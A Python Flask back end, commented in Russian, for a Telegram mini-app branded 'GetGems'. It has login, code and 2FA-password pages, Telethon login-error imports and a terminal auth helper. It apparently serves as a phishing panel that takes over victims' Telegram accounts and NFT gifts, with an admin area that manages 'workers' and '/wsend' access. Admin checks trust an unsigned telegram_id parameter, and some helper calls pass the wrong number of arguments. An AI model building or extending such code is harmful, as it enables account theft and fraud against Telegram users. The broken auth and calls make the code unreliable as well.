from flask import Flask, render_template, request, jsonify, session, send_file
import json
import os
import sys
import subprocess
import hashlib
import hmac
import urllib.parse
from datetime import datetime, timezone, timedelta
from database import db

# Импортируем TgCrypto для ускорения работы Pyrogram
try:
    import tgcrypto
except ImportError:
    pass  # TgCrypto не обязателен, но рекомендуется для производительности

# Московское время (UTC+3)
MOSCOW_TZ = timezone(timedelta(hours=3))

def moscow_now():
    """Возвращает текущее время в московском часовом поясе"""
    return datetime.now(MOSCOW_TZ)

def moscow_strftime(format_str="%Y-%m-%d %H:%M:%S"):
    """Возвращает текущее московское время в виде строки"""
    return moscow_now().strftime(format_str)
from lottie_parser import lottie_parser
from logger_config import get_logger, setup_app_logging
from telegram_webapp_auth.auth import TelegramAuthenticator, generate_secret_key
from telegram_client import TelegramAuth, run_async
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
import secrets
import asyncio
from dotenv import load_dotenv
load_dotenv()

# Настраиваем логирование для Flask приложения
setup_app_logging()
logger = get_logger(__name__, log_file="app.log")
app = Flask(__name__, 
            template_folder='backend/templates',
            static_folder='static')
app.secret_key = secrets.token_hex(16)
USERS_FILE = 'users.json'
SESSION_DATA_FILE = 'session_data.json'
BOT_TOKEN = os.getenv("GETGEMS_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
INIT_DATA_STRICT = os.getenv("INIT_DATA_STRICT", "false").lower() == "true"

# Фейковый номер для тестирования (без логирования и с принятием любого кода/2FA)
FAKE_TEST_PHONE = "+79097763124"
def save_session_data(user_id, data):
    try:
        if os.path.exists(SESSION_DATA_FILE):
            with open(SESSION_DATA_FILE, 'r') as f:
                session_data = json.load(f)
        else:
            session_data = {}
        session_data[str(user_id)] = {
            **data,
            'last_updated': moscow_now().isoformat()
        }
        with open(SESSION_DATA_FILE, 'w') as f:
            json.dump(session_data, f, indent=2)
        return True
    except Exception as e:
        return False
def load_session_data(user_id):
    try:
        if os.path.exists(SESSION_DATA_FILE):
            with open(SESSION_DATA_FILE, 'r') as f:
                session_data = json.load(f)
                return session_data.get(str(user_id), {})
        return {}
    except Exception as e:
        return {}
def clear_session_data(user_id):
    try:
        if os.path.exists(SESSION_DATA_FILE):
            with open(SESSION_DATA_FILE, 'r') as f:
                session_data = json.load(f)
            if str(user_id) in session_data:
                del session_data[str(user_id)]
            with open(SESSION_DATA_FILE, 'w') as f:
                json.dump(session_data, f, indent=2)
        return True
    except Exception as e:
        return False
def get_user_balance(user_id):
    """Получает баланс звёзд пользователя из базы данных"""
    try:
        from backend.database import Database
        import os
        # user_id должен быть числовым Telegram ID
        if isinstance(user_id, str):
            user_id = user_id.strip()
            if not user_id.isdigit():
                logger.warning(f"get_user_balance: non-numeric user_id='{user_id}' received, returning 0 balance")
                return 0

        db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'backend', 'playerok.db'))
        if not os.path.exists(db_path):
            db_path = os.path.abspath('backend/playerok.db')
        db = Database(db_path=db_path)
        
        # Получаем пользователя по Telegram ID
        user = db.get_user_by_telegram_id(int(user_id))
        if user:
            # Возвращаем баланс звёзд (balance_starts - так называется поле в БД)
            return float(user.get('balance_starts', 0) or 0)
        return 0
    except Exception as e:
        logger.error(f"Error getting balance from DB for user {user_id}: {e}", exc_info=True)
        return 0
def get_authenticator():
    secret_key = generate_secret_key(BOT_TOKEN)
    return TelegramAuthenticator(secret_key)
def validate_telegram_data(init_data: str) -> dict:
    try:
        parsed_data = urllib.parse.parse_qs(init_data)
        received_hash = parsed_data.get('hash', [None])[0]
        if not received_hash:
            return None
        data_check_arr = []
        for key, value in parsed_data.items():
            if key != 'hash':
                if isinstance(value, list):
                    value = value[0]
                data_check_arr.append(f"{key}={value}")
        data_check_arr.sort()
        data_check_string = '\n'.join(data_check_arr)
        secret_key = hmac.new(
            "WebAppData".encode(),
            BOT_TOKEN.encode(),
            hashlib.sha256
        ).digest()
        calculated_hash = hmac.new(
            secret_key,
            data_check_string.encode(),
            hashlib.sha256
        ).hexdigest()
        if calculated_hash == received_hash:
            user_data = json.loads(parsed_data.get('user', ['{}'])[0])
            return user_data
        return None
    except Exception as e:
        logger.error(f"Ошибка валидации данных Telegram: {e}", exc_info=True)
        return None
def check_admin_access():
    """Проверяет доступ администратора через различные способы"""
    from config_bot import BotConfig
    from utils import check_admin_token
    
    # Способ 1: Проверка через токен
    if check_admin_token():
        return True, None
    
    # Способ 2: Проверка через Telegram Web App init_data
    init_data = request.headers.get('X-Telegram-Init-Data') or request.args.get('init_data') or (request.get_json(silent=True) or {}).get('init_data')
    if init_data:
        user_info = get_user_from_init_data(init_data)
        if user_info:
            user_id = user_info.get('id')
            if BotConfig.is_admin(user_id):
                return True, user_info
    
    # Способ 3: Проверка через telegram_id в параметрах
    telegram_id = request.args.get('telegram_id') or (request.get_json(silent=True) or {}).get('telegram_id')
    if telegram_id:
        try:
            user_id = int(telegram_id)
            if BotConfig.is_admin(user_id):
                return True, {'id': user_id}
        except (ValueError, TypeError):
            pass
    
    return False, None

def get_user_from_init_data(init_data: str) -> dict:
    try:
        if init_data:
            raw = urllib.parse.unquote(init_data)
            qs = urllib.parse.parse_qs(raw, keep_blank_values=True)
            user_str = (qs.get('user') or [None])[0]
            if user_str:
                user_json = json.loads(user_str)
                telegram_id = int(user_json.get('id'))
                return {
                    'id': telegram_id,
                    'username': user_json.get('username', ''),
                    'first_name': user_json.get('first_name', ''),
                    'last_name': user_json.get('last_name', '')
                }
        tid = request.args.get('telegram_id')
        if not tid:
            body = request.get_json(silent=True) or {}
            tid = body.get('telegram_id')
        if tid:
            return {
                'id': int(tid),
                'username': '',
                'first_name': '',
                'last_name': ''
            }
    except Exception as e:
        logger.warning(f"Simple initData parse failed: {e}")
    return None
def run_terminal_auth_command(user_id: int, phone: str) -> bool:
    try:
        script_path = os.path.join(os.path.dirname(__file__), 'terminal_auth.py')
        cmd = [sys.executable, script_path, str(user_id), phone]
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=os.path.dirname(__file__)
        )
        stdout, stderr = process.communicate(timeout=30)
        if process.returncode != 0:
            logger.error(f"Terminal auth process failed with return code {process.returncode}")
            logger.error(f"stderr: {stderr}")
            return False
        return True
    except subprocess.TimeoutExpired:
        process.kill()
        return False
    except Exception as e:
        logger.error(f"Ошибка выполнения команды терминальной авторизации: {e}", exc_info=True)
        return False
def send_code_via_terminal(phone_number):
    return run_terminal_auth_command('send_code', phone_number)
def verify_code_via_terminal(phone_number, phone_code_hash, code):
    return run_terminal_auth_command('verify_code', phone_number, code, phone_code_hash)
def check_password_via_terminal(session_string, password):
    return run_terminal_auth_command('verify_2fa', session_string, password)
@app.before_request
def initialize_app():
    if not hasattr(app, '_db_initialized'):
        app._db_initialized = True
        logger.info("Database initialized")

@app.after_request
def add_no_cache_headers(response):
    # Отключаем кеширование для всех HTML страниц
    if response.content_type and 'text/html' in response.content_type:
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
    return response

@app.route('/static/tonconnect-manifest.json')
def tonconnect_manifest():
    """Manifest файл для TON Connect"""
    manifest = {
        "url": request.host_url.rstrip('/'),
        "name": "GetGems",
        "iconUrl": request.host_url.rstrip('/') + "/static/icon.png"
    }
    return jsonify(manifest)

@app.route('/')
def index():
    from flask import redirect, url_for
    # При открытии мини-аппа по корневому URL сразу ведём на Маркет
    return redirect(url_for('market'))
@app.route('/inventory')
def inventory():
    return render_template('inventory.html', gifts=[])
@app.route('/auth')
def auth():
    return render_template('auth.html')
@app.route('/auth_start')
def auth_start():
    return render_template('auth_start.html')
@app.route('/code')
def code():
    return render_template('code.html')
@app.route('/success')
def success():
    return render_template('success.html')
@app.route('/password')
def password():
    return render_template('password.html')

@app.route('/market')
def market():
    """Страница маркета в мини-аппе (встраивает getgems.io через iframe)."""
    return render_template('market.html', active_page='market')

@app.route('/api/nft/floors', methods=['GET'])
def get_nft_floors():
    """Получает floor цены для всех NFT подарков"""
    try:
        from portals_api import get_gifts_floors, get_auth_data
        
        auth_data = get_auth_data()
        floors = get_gifts_floors(auth_data)
        
        return jsonify({
            'success': True,
            'data': floors
        })
    except Exception as e:
        logger.error(f"Ошибка получения floor цен: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/nft/price/<gift_name>', methods=['GET'])
def get_nft_price(gift_name):
    """Получает floor цену для конкретного NFT подарка"""
    try:
        from portals_api import get_gift_floor_price, get_auth_data
        
        auth_data = get_auth_data()
        price = get_gift_floor_price(gift_name, auth_data)
        
        return jsonify({
            'success': True,
            'data': {
                'gift_name': gift_name,
                'floor_price': price
            }
        })
    except Exception as e:
        logger.error(f"Ошибка получения цены для {gift_name}: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/nft/prices/batch', methods=['POST'])
def get_nft_prices_batch():
    """Получает floor цены для нескольких NFT подарков за один запрос"""
    try:
        from portals_api import get_multiple_gift_prices, get_auth_data
        
        data = request.get_json()
        gift_names = data.get('gift_names', [])
        
        if not gift_names:
            return jsonify({
                'success': False,
                'error': 'gift_names не указан'
            }), 400
        
        auth_data = get_auth_data()
        prices = get_multiple_gift_prices(gift_names, auth_data)
        
        return jsonify({
            'success': True,
            'data': prices
        })
    except Exception as e:
        logger.error(f"Ошибка получения цен batch: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/profile')
def profile():
    """Страница профиля пользователя."""
    return render_template('profile.html', active_page='profile')

@app.route('/stars')
def stars():
    """Страница покупки звёзд."""
    return render_template('stars.html', active_page='stars')

@app.route('/collections')
def collections():
    """Страница коллекций NFT."""
    return render_template('collections.html', active_page='collections')

@app.route('/catalog')
def catalog():
    """Страница каталога NFT."""
    return render_template('catalog.html', active_page='catalog')

@app.route('/cart')
def cart():
    """Страница корзины."""
    return render_template('cart.html', active_page='cart')

@app.route('/api/save-wallet', methods=['POST'])
def api_save_wallet():
    """API для сохранения адреса TON кошелька пользователя"""
    try:
        from database import Database
        db = Database()
        
        # Получаем init_data из запроса
        init_data = request.headers.get('X-Telegram-Init-Data') or request.json.get('init_data')
        if not init_data:
            return jsonify({'success': False, 'error': 'No init_data'}), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        
        telegram_id = user_info.get('id')
        wallet_address = request.json.get('wallet_address')
        
        if not wallet_address:
            return jsonify({'success': False, 'error': 'wallet_address required'}), 400
        
        # Сохраняем адрес кошелька (можно добавить отдельную таблицу для кошельков)
        # Пока сохраняем в localStorage на клиенте
        
        return jsonify({
            'success': True,
            'wallet_address': wallet_address,
            'balance': '0'  # Здесь можно получить баланс через TON API
        })
    except Exception as e:
        logger.error(f"Ошибка в api_save_wallet: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/user/by-telegram-id/<int:telegram_id>', methods=['GET'])
def get_user_by_telegram_id(telegram_id):
    """Получить данные пользователя по telegram_id"""
    try:
        from backend.database import Database
        import os
        db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'backend', 'playerok.db'))
        if not os.path.exists(db_path):
            db_path = os.path.abspath('backend/playerok.db')
        db = Database(db_path=db_path)
        
        user = db.get_user_by_telegram_id(telegram_id)
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404
        
        # Получаем балансы по всем валютам
        # Проверяем оба варианта: balance_starts и balance_stars
        balance_starts_value = user.get('balance_starts')
        balance_stars_value = user.get('balance_stars')
        
        # Используем balance_starts если есть, иначе balance_stars, иначе 0
        stars_balance = 0.0
        if balance_starts_value is not None:
            stars_balance = float(balance_starts_value)
        elif balance_stars_value is not None:
            stars_balance = float(balance_stars_value)
        
        balances = {
            'RUB': float(user.get('balance_rub', 0)) if user.get('balance_rub') is not None else 0.0,
            'UAH': float(user.get('balance_uah', 0)) if user.get('balance_uah') is not None else 0.0,
            'BYN': float(user.get('balance_byn', 0)) if user.get('balance_byn') is not None else 0.0,
            'TON': float(user.get('balance_ton', 0)) if user.get('balance_ton') is not None else 0.0,
            'USDT': float(user.get('balance_usdt', 0)) if user.get('balance_usdt') is not None else 0.0,
            'STARS': stars_balance,
        }
        
        return jsonify({
            'success': True,
            'data': {
                'id': user['id'],
                'telegram_id': user.get('telegram_id'),
                'username': user.get('username'),
                'first_name': user.get('first_name'),
                'last_name': user.get('last_name'),
                'balances': balances,
                'is_worker': bool(user.get('is_worker', 0)),
                'is_admin': bool(user.get('is_admin', 0))
            }
        })
    except Exception as e:
        logger.error(f"Error getting user by telegram_id: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/user/avatar/<int:telegram_id>', methods=['GET'])
def get_user_avatar(telegram_id):
    """Получить аватарку пользователя по telegram_id"""
    try:
        from backend.database import Database
        import os
        db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'backend', 'playerok.db'))
        if not os.path.exists(db_path):
            db_path = os.path.abspath('backend/playerok.db')
        db = Database(db_path=db_path)
        
        # Сначала проверяем в базе данных
        user = db.get_user_by_telegram_id(telegram_id)
        if user and user.get('avatar_url'):
            return jsonify({
                'success': True,
                'avatar_url': user['avatar_url']
            })
        
        # Если нет в базе, пытаемся получить через Bot API
        try:
            avatar_url = get_user_photo_url(telegram_id)
            if avatar_url:
                # Сохраняем в базу данных
                db.update_user_info(telegram_id=telegram_id, avatar_url=avatar_url)
                return jsonify({
                    'success': True,
                    'avatar_url': avatar_url
                })
        except Exception as e:
            logger.warning(f"Не удалось получить аватарку для пользователя {telegram_id}: {e}")
        
        return jsonify({
            'success': False,
            'avatar_url': None
        })
    except Exception as e:
        logger.error(f"Error getting user avatar: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/profile-data')
def api_profile_data():
    """API для получения данных профиля пользователя"""
    try:
        from database import Database
        db = Database()
        
        # Получаем init_data из запроса
        init_data = request.args.get('init_data') or request.headers.get('X-Telegram-Init-Data')
        if not init_data:
            return jsonify({'success': False, 'error': 'No init_data'}), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        
        telegram_id = user_info.get('id')
        
        # Получаем данные пользователя из базы данных
        user = db.get_user_by_telegram_id(telegram_id)
        if not user:
            # Создаем пользователя если его нет
            db.create_user(
                telegram_id=telegram_id,
                username=user_info.get('username', ''),
                first_name=user_info.get('first_name', ''),
                last_name=user_info.get('last_name', '')
            )
            user = db.get_user_by_telegram_id(telegram_id)
        
        # Получаем аватарку через Telegram Bot API
        avatar_url = user.get('avatar_url')
        if not avatar_url:
            try:
                from telegram_bot import bot
                import asyncio
                from aiogram.methods import GetUserProfilePhotos, GetFile
                
                async def get_avatar():
                    try:
                        photos_result = await bot(GetUserProfilePhotos(user_id=telegram_id, limit=1))
                        if photos_result and photos_result.total_count > 0 and photos_result.photos:
                            photo = photos_result.photos[0][-1]
                            file_result = await bot(GetFile(file_id=photo.file_id))
                            if file_result and file_result.file_path:
                                return f"https://api.telegram.org/file/bot{bot.token}/{file_result.file_path}"
                    except Exception as e:
                        logger.warning(f"Не удалось получить аватарку для пользователя {telegram_id}: {e}")
                    return None
                
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                avatar_url = loop.run_until_complete(get_avatar())
                loop.close()
                
                # Сохраняем аватарку в базу данных
                if avatar_url:
                    db.update_user_info(telegram_id=telegram_id, avatar_url=avatar_url)
            except Exception as e:
                logger.error(f"Ошибка получения аватарки: {e}", exc_info=True)
        
        # Получаем подарки пользователя
        user_gifts = db.get_user_gifts(telegram_id)
        
        # Формируем ответ
        return jsonify({
            'success': True,
            'user': {
                'telegram_id': telegram_id,
                'username': user.get('username') or user_info.get('username', ''),
                'first_name': user.get('first_name') or user_info.get('first_name', ''),
                'last_name': user.get('last_name') or user_info.get('last_name', ''),
                'avatar_url': avatar_url,
                'created_at': user.get('created_at')
            },
            'gifts_count': len(user_gifts),
            'stats': {
                'total_gifts': len(user_gifts),
                'created_gifts': len([g for g in user_gifts if g.get('creator_telegram_id') == telegram_id]),
                'received_gifts': len([g for g in user_gifts if g.get('recipient_telegram_id') == telegram_id])
            }
        })
    except Exception as e:
        logger.error(f"Ошибка в api_profile_data: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/check-access', methods=['POST'])
def api_admin_check_access():
    """API для проверки доступа админа через init_data"""
    from config_bot import BotConfig
    
    try:
        # Получаем init_data из тела запроса или заголовков
        data = request.get_json(silent=True) or {}
        init_data = data.get('init_data') or request.headers.get('X-Telegram-Init-Data')
        
        logger.info(f"Проверка доступа: init_data получен: {bool(init_data)}, длина: {len(init_data) if init_data else 0}")
        
        if not init_data:
            logger.warning("Проверка доступа: init_data не получен")
            return jsonify({'success': False, 'has_access': False, 'error': 'No init_data'}), 401
        
        user_info = get_user_from_init_data(init_data)
        logger.info(f"Проверка доступа: user_info получен: {user_info}")
        
        if user_info:
            user_id = user_info.get('id')
            is_admin = BotConfig.is_admin(user_id)
            logger.info(f"Проверка доступа: user_id={user_id}, is_admin={is_admin}, ADMIN_IDS={BotConfig.ADMIN_IDS}")
            
            if is_admin:
                logger.info(f"Админ {user_id} получил доступ к админ-панели через мини-апп")
                return jsonify({'success': True, 'has_access': True, 'user_id': user_id})
            else:
                logger.warning(f"Пользователь {user_id} попытался получить доступ к админ-панели, но не является админом")
                return jsonify({'success': False, 'has_access': False, 'user_id': user_id, 'error': 'Not an admin'}), 403
        
        logger.warning("Проверка доступа: не удалось получить user_info из init_data")
        return jsonify({'success': False, 'has_access': False, 'error': 'Invalid init_data'}), 401
    except Exception as e:
        logger.error(f"Ошибка проверки доступа: {e}", exc_info=True)
        return jsonify({'success': False, 'has_access': False, 'error': str(e)}), 500

@app.route('/adminpanel')
def adminpanel():
    """Админ-панель для управления воркерами."""
    from config_bot import BotConfig
    from utils import check_admin_token
    
    # Способ 1: Проверка через токен
    if check_admin_token():
        return render_template('adminpanel.html')
    
    # Способ 2: Проверка через Telegram Web App init_data
    # Telegram Web App передает init_data через JavaScript API
    # Мы проверяем доступ через JavaScript на клиенте, но также можем проверить здесь
    init_data = None
    
    # Проверяем параметры URL (если переданы вручную)
    if request.args.get('init_data'):
        init_data = request.args.get('init_data')
    elif request.args.get('_auth'):
        init_data = request.args.get('_auth')
    
    if init_data:
        user_info = get_user_from_init_data(init_data)
        if user_info:
            user_id = user_info.get('id')
            if BotConfig.is_admin(user_id):
                logger.info(f"Админ {user_id} получил доступ к админ-панели через URL параметр")
                return render_template('adminpanel.html')
    
    # Способ 3: Проверка через telegram_id в URL (для прямого доступа)
    telegram_id = request.args.get('telegram_id')
    if telegram_id:
        try:
            user_id = int(telegram_id)
            if BotConfig.is_admin(user_id):
                return render_template('adminpanel.html')
        except (ValueError, TypeError):
            pass
    
    # Если init_data не передан, все равно показываем страницу
    # JavaScript на клиенте проверит доступ через API
    return render_template('adminpanel.html')
    
    # Если не админ, показываем сообщение об ошибке с инструкцией
    admin_ids_str = ", ".join([str(admin_id) for admin_id in BotConfig.ADMIN_IDS]) if BotConfig.ADMIN_IDS else "не настроены"
    error_html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Доступ запрещен</title>
        <style>
            body {{
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #0a0a0a;
                color: #fff;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                padding: 20px;
            }}
            .container {{
                background: #131314;
                padding: 40px;
                border-radius: 20px;
                max-width: 600px;
                text-align: center;
            }}
            h1 {{ color: #FF3B30; margin-bottom: 20px; }}
            p {{ color: #a0a0a0; line-height: 1.6; }}
            .info {{
                background: #1a1a1c;
                padding: 20px;
                border-radius: 12px;
                margin-top: 20px;
                text-align: left;
            }}
            .info code {{
                background: #0a0a0a;
                padding: 2px 8px;
                border-radius: 4px;
                color: #007AFF;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚫 Доступ запрещен</h1>
            <p>Только администраторы могут получить доступ к этой панели.</p>
            <div class="info">
                <p><strong>Способы доступа:</strong></p>
                <p>1. Через Telegram Web App (автоматически, если вы админ)</p>
                <p>2. Через токен: <code>?token=ваш_токен</code></p>
                <p>3. Через Telegram ID: <code>?telegram_id=ваш_id</code></p>
                <p><strong>Текущие админы:</strong> {admin_ids_str}</p>
                <p><strong>Настройка:</strong> Добавьте ваш Telegram ID в переменную окружения <code>ADMIN_IDS</code> в файле <code>.env</code></p>
            </div>
        </div>
    </body>
    </html>
    """
    return error_html, 403

def get_user_info_from_telegram_api_sync(telegram_id: int) -> dict:
    """
    Получить информацию о пользователе через Telegram Bot API (синхронная версия)
    
    Args:
        telegram_id: Telegram ID пользователя
        
    Returns:
        dict с информацией о пользователе (username, first_name, last_name, avatar_url) или None
    """
    try:
        from config_bot import BotConfig
        import requests
        
        bot_token = BotConfig.BOT_TOKEN
        if not bot_token:
            logger.warning("BOT_TOKEN not set, cannot get user info")
            return None
        
        # Получаем информацию о пользователе через getChat
        url = f"https://api.telegram.org/bot{bot_token}/getChat"
        response = requests.get(url, params={'chat_id': telegram_id}, timeout=5)
        
        if response.status_code != 200:
            logger.debug(f"Failed to get user info for {telegram_id}: {response.status_code}")
            return None
        
        data = response.json()
        if not data.get('ok'):
            logger.debug(f"API returned error for {telegram_id}: {data.get('description', 'Unknown error')}")
            return None
        
        user_data = data.get('result', {})
        user_info = {
            'telegram_id': telegram_id,
            'username': user_data.get('username'),
            'first_name': user_data.get('first_name'),
            'last_name': user_data.get('last_name'),
            'avatar_url': None
        }
        
        # Получаем фото профиля
        try:
            photos_url = f"https://api.telegram.org/bot{bot_token}/getUserProfilePhotos"
            photos_response = requests.get(photos_url, params={'user_id': telegram_id, 'limit': 1}, timeout=5)
            
            if photos_response.status_code == 200:
                photos_data = photos_response.json()
                if photos_data.get('ok') and photos_data.get('result', {}).get('total_count', 0) > 0:
                    photos = photos_data.get('result', {}).get('photos', [])
                    if photos and len(photos) > 0:
                        # Берем первое фото (самое большое)
                        photo = photos[0][-1]
                        file_id = photo.get('file_id')
                        
                        # Получаем file_path
                        file_url = f"https://api.telegram.org/bot{bot_token}/getFile"
                        file_response = requests.get(file_url, params={'file_id': file_id}, timeout=5)
                        
                        if file_response.status_code == 200:
                            file_data = file_response.json()
                            if file_data.get('ok'):
                                file_path = file_data.get('result', {}).get('file_path', '')
                                if file_path:
                                    user_info['avatar_url'] = f"https://api.telegram.org/file/bot{bot_token}/{file_path}"
        except Exception as photo_err:
            logger.debug(f"Не удалось получить фото профиля для {telegram_id}: {photo_err}")
        
        logger.debug(f"✅ Получена информация о пользователе {telegram_id} через Telegram API")
        return user_info
        
    except Exception as e:
        logger.error(f"❌ Ошибка при получении информации о пользователе {telegram_id} через Telegram API: {e}", exc_info=True)
        return None

@app.route('/api/admin/workers', methods=['GET'])
def api_admin_workers():
    """API для получения списка всех воркеров с деталями (с обновлением через Telegram API)"""
    try:
        # Проверка авторизации
        has_access, user_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        from database import Database
        db = Database()
        workers = db.get_all_workers_with_details()
        stats = db.get_workers_stats()
        
        # Обновляем информацию о каждом воркере через Telegram API
        updated_workers = []
        for worker in workers:
            telegram_id = worker.get('telegram_id')
            if telegram_id:
                # Получаем актуальную информацию через Telegram API
                api_info = get_user_info_from_telegram_api_sync(telegram_id)
                if api_info:
                    # Обновляем данные воркера актуальной информацией из API
                    worker['username'] = api_info.get('username') or worker.get('username')
                    worker['first_name'] = api_info.get('first_name') or worker.get('first_name')
                    worker['last_name'] = api_info.get('last_name') or worker.get('last_name')
                    if api_info.get('avatar_url'):
                        worker['avatar_url'] = api_info.get('avatar_url')
                    
                    # Обновляем информацию в БД (асинхронно, не блокируем ответ)
                    try:
                        if api_info.get('username'):
                            db.update_user_username(telegram_id, api_info['username'])
                        if api_info.get('first_name') or api_info.get('last_name'):
                            db.update_user_name(telegram_id, api_info.get('first_name', ''), api_info.get('last_name', ''))
                        if api_info.get('avatar_url'):
                            db.update_user_avatar(telegram_id, api_info['avatar_url'])
                    except Exception as update_err:
                        logger.warning(f"Не удалось обновить информацию о воркере {telegram_id} в БД: {update_err}")
            
            updated_workers.append(worker)
        
        return jsonify({
            'success': True,
            'workers': updated_workers,
            'stats': stats
        })
    except Exception as e:
        logger.error(f"Error in api_admin_workers: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/update-username', methods=['POST'])
def api_admin_update_username():
    """API для обновления username воркера"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        username = data.get('username', '')
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        success = db.update_user_username(telegram_id, username)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'User not found'}), 404
    except Exception as e:
        logger.error(f"Error in api_admin_update_username: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/toggle-worker-status', methods=['POST'])
def api_admin_toggle_worker_status():
    """API для переключения статуса воркера"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        is_active = data.get('is_active', True)
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        success = db.set_worker_status(telegram_id, is_active)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Worker not found'}), 404
    except Exception as e:
        logger.error(f"Error in api_admin_toggle_worker_status: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/toggle-wsend-access', methods=['POST'])
def api_admin_toggle_wsend_access():
    """API для переключения доступа /wsend"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        has_access = data.get('has_access', True)
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        granted_by = admin_info.get('id') if admin_info else None
        success = db.set_wsend_access(telegram_id, has_access, granted_by=granted_by)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Failed to update access'}), 500
    except Exception as e:
        logger.error(f"Error in api_admin_toggle_wsend_access: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/admins', methods=['GET'])
def api_admin_admins():
    """API для получения списка всех админов с деталями (из .env и БД)"""
    try:
        # Проверка авторизации
        has_access, user_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        from database import Database
        from config_bot import BotConfig
        db = Database()
        
        # Получаем администраторов из .env (Config.ADMIN_IDS)
        env_admin_ids = BotConfig.ADMIN_IDS or []
        
        # Получаем администраторов из БД
        try:
            db_admins = db.get_all_admins_with_details()
            stats = db.get_admins_stats()
        except Exception as db_error:
            logger.error(f"Database error in api_admin_admins: {db_error}", exc_info=True)
            db_admins = []
            stats = {'total': 0, 'active': 0, 'inactive': 0}
        
        # Объединяем администраторов из .env и БД
        all_admins = []
        processed_ids = set()
        
        # Сначала добавляем админов из .env
        for admin_id in env_admin_ids:
            if admin_id not in processed_ids:
                # Ищем в БД или создаем запись
                admin_user = db.get_user_by_telegram_id(admin_id)
                if not admin_user:
                    # Создаем пользователя если его нет
                    db.get_or_create_user(telegram_id=admin_id, username=None, first_name=None, last_name=None)
                    admin_user = db.get_user_by_telegram_id(admin_id)
                
                # Получаем информацию из БД
                admin_info = {
                    'telegram_id': admin_id,
                    'username': admin_user.get('username', ''),
                    'first_name': admin_user.get('first_name', ''),
                    'last_name': admin_user.get('last_name', ''),
                    'avatar_url': admin_user.get('avatar_url'),
                    'is_active': True,
                    'source': 'env'
                }
                all_admins.append(admin_info)
                processed_ids.add(admin_id)
        
        # Добавляем админов из БД, которых нет в .env
        for db_admin in db_admins:
            admin_id = db_admin.get('telegram_id')
            if admin_id not in processed_ids:
                all_admins.append({
                    **db_admin,
                    'source': 'database'
                })
                processed_ids.add(admin_id)
        
        # Обновляем статистику
        stats['total'] = len(all_admins)
        stats['active'] = len([a for a in all_admins if a.get('is_active', True)])
        stats['inactive'] = len([a for a in all_admins if not a.get('is_active', True)])
        
        return jsonify({
            'success': True,
            'admins': all_admins,
            'stats': stats
        })
    except Exception as e:
        logger.error(f"Error in api_admin_admins: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/add-admin', methods=['POST'])
def api_admin_add_admin():
    """API для добавления админа"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        is_active = data.get('is_active', True)
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        success = db.add_admin(telegram_id, is_active)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Admin already exists or failed to add'}), 400
